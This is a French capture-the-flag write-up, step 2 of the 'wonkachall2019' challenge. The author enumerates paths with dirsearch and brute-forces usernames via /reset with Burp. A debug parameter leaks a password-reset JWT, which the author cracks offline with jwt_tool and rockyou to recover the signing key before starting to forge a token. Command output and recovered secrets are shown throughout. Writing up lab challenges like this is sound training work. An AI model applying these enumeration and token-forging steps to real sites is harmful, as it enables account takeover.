# Step 2

Dans le dirsearch, à part le .git on a :

```bash
[11:10:46] 200 -    5KB - /login
[11:10:47] 302 -  209B  - /logout  ->  http://willywonka.shop/
[11:10:51] 500 -  290B  - /profile
[11:10:52] 200 -    4KB - /register
[11:10:52] 200 -    4KB - /reset
[11:10:55] 302 -  265B  - /submit  ->  http://willywonka.shop/profile?filetype=image%2Fpng
```

On peut bf les users avec le `/reset`

Go intruder burp avec seclist username short : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt

La taille sur l'utilisateur test change -> 500

![bf_user_test](img/bf_user_test.png)

le debug=1 trouvé dans les sources du git + message commit :

> https://willywonka.shop/reset?debug=1

```json


Fatal error: Uncaught exception 'Swift_TransportException' with message 'Expected response code 354 but got code "566", with message "566 SMTP limit exceeded"' in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php:386

Stack trace:

#0 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(281): Swift_Transport_AbstractSmtpTransport->_assertResponseCode('566 SMTP limit ...', Array)

#1 /usr/local/lib/php/Swift/Transport/EsmtpTransport.php(245): Swift_Transport_AbstractSmtpTransport->executeCommand('DATA\r\n', Array, Array)

#2 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(321): Swift_Transport_EsmtpTransport->executeCommand('DATA\r\n', Array)

#3 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(432): Swift_Transport_AbstractSmtpTransport->_doDataCommand()

#4 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(449): Swift_Transport_AbstractSmtpTransport->_doMailTransaction(Object(Swift_Message), 'support@songboo...', Array, Array)

#5 /usr/local/lib/php/Swift/Transport/Abstra in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php on line 386

While trying to send:

{
    "dest":['test'],
    "object":'Password reset instructions for WillyWonka Shop',
    "from":'admin@wwonka.shop',"relay":'backend.willywonka.shop',
    "content-html":'
        <html>
            <head>
                <meta http-equiv="content-type" content="text/html; charset=UTF-8">
                <title></title>
            </head>
            <body text="#000000" bgcolor="#FFFFFF">
                <b>Hello dear associate,</b><br>
                <br>
                You are receiving this mail after a password reset request has been
                submitted on Willy Wonka Golden Ticket Shop. <br>
                <br>

                In order to reset your password, please use this login link and
                reset your password from your profile <br>
                <br>
                <i><font size="+3"><a moz-do-not-send="true"
                href="http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o">Reset my password</a></font></i><br>
                <br>
                <i><b>Note : if you didn't request this email, please ensure your
                account hasn't been accessed and perform any relevant security
                hardening.</b></i><br>
                <br>
                Have a nice day<br>
                <br>
                Willy Wonka<br>
                <a moz-do-not-send="true" href="http://willywonka.shop/">/</a><br>
            </body>
        </html>',
    "content-text":'
        Hello dear associate,
        
        You are receiving this mail after a password reset request has been submitted on Willy Wonka Golden Ticket Shop.
        
        In order to reset your password, please use this login link and reset your password from your profile
        
        http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
        
        Note : if you didn't request this email, please ensure your account hasn't been accessed and perform any relevant security hardening.
        
        Have a nice day
        
        Willy Wonka
        http://willywonka.shop/'
}

Find more documentation here :
https://google.fr
https://stackoverflow.com
https://lmgtfy.com

```

> backend.willywonka.shop

> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o

## Dirsearch sur backend

trop de 403; donc je les ai viré des résulat pour éviter trop de garbage

```bash
➜  wonkachall2019 git:(master) ✗ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx -t 25 | grep -v 403

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: do, java, action, db, sql, ~, xml, pdf, jsp, php, old, bak, zip, tar, asp, aspx, txt, html, xsl, xslx | HTTP method: get | Threads: 25 | Wordlist size: 13259

Error Log: /opt/t/pentest/recona/dirsearch/logs/errors-19-07-09_11-44-07.log

Target: https://backend.willywonka.shop

[11:44:07] Starting: 
[11:44:07] 400 -  166B  - /%2e%2e/google.com
[11:44:32] 200 -    2KB - /login
[11:44:33] 302 -  219B  - /logout  ->  http://backend.willywonka.shop/login
[11:44:37] 302 -  219B  - /reset  ->  http://backend.willywonka.shop/login
```

retente avec le `/reset?debug=1` comme sur le frontend -> on voit un set-cookie

![backend_setcookie](img/jwt_backend_cookie.png)

> eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIk5vIHRva2VuIHByb3ZpZGVkIl19XX0.XSRiRw.QMJ9BsJX127QbsE-FgmcvQm-uBM

```json
{
  "_flashes": [
    {
      " t": [
        "message",
        "No token provided"
      ]
    }
  ]
}

{}
```

## Crack the jwt

```bash
➜  jwt_tool git:(master) python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 

,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
----''----''----''----''----''----''----''----''----''----'
     ,--.,--.   ,--.,--------.,--------.             ,--.
     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |
,--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |
|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |
 `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'
,----.,----.,----.,----.,----.,----.,----.,----.,----.,----.
'----''----''----''----''----''----''----''----''----''----'

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] sub = test
[+] aud = frontend.willywonka.shop
[+] iat = 1562664315
[+] exp = 1562664915

######################################################
# Options:                                           #
# 1: Check CVE-2015-2951 - alg=None vulnerability    #
# 2: Check for Public Key bypass in RSA mode         #
# 3: Check signature against a key                   #
# 4: Check signature against a key file ("kid")      #
# 5: Crack signature with supplied dictionary file   #
# 6: Tamper with payload data (key required to sign) #
# 0: Quit                                            #
######################################################

Please make a selection (1-6)
> 5

Loading key dictionary...
File loaded: /opt/t/bf/rockyou.txt
Testing 14344380 passwords...
[+] s3cr3t is the CORRECT key!
```

## Craft new jwt

> https://www.jsonwebtoken.io/

* existing 

> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o

```json
{
 "typ": "JWT",
 "alg": "HS256"
}
{
 "sub": "test",
 "aud": "frontend.willywonka.shop",
 "iat": 1562664315,
 "exp": 1562664915
}
```

> clé secrète : s3cr3t